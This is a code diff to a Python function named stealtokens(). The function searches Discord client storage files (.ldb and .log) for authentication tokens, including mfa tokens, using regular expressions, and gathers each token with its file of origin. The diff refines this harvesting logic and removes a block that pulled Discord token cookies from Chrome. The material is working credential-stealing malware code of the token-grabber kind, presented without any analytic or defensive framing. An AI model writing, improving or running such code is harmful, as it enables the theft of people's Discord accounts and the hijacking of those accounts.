@@ -15,34 +15,22 @@ def stealtokens():
                     for file in files:
                         if file.endswith(('.ldb', '.log')):
                             try:
-                                with open(os.path.join(root, file), 'r', encoding='utf-8', errors='ignore') as f:
+                                file_path = os.path.join(root, file)
+                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                     content = f.read()
                                 
-                                token_patterns = [
-                                    r'[\\w-]{24}\\\\.[\\w-]{6}\\\\.[\\w-]{27}',
-                                    r'mfa\\\\.[\\w-]{84}'
-                                ]
+                                import re
+                                token_pattern = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}'
+                                found_tokens = re.findall(token_pattern, content)
                                 
-                                for pattern in token_patterns:
-                                    found_tokens = re.findall(pattern, content)
-                                    for token in found_tokens:
-                                        tokens.append({
-                                            'source': 'Desktop',
-                                            'client': os.path.basename(discord_path),
-                                            'token': token
-                                        })
+                                for token in found_tokens:
+                                    tokens.append({
+                                        'source': 'Desktop',
+                                        'client': os.path.basename(discord_path),
+                                        'token': token,
+                                        'file': file
+                                    })
                             except:
                                 continue
-    
-    try:
-        chrome_cookies = browser_cookie3.chrome(domain_name='discord.com')
-        for cookie in chrome_cookies:
-            if cookie.name.lower() == 'token':
-                tokens.append({
-                    'source': 'Chrome Cookies',
-                    'token': cookie.value
-                })
-    except:
-        pass
     
     return tokens
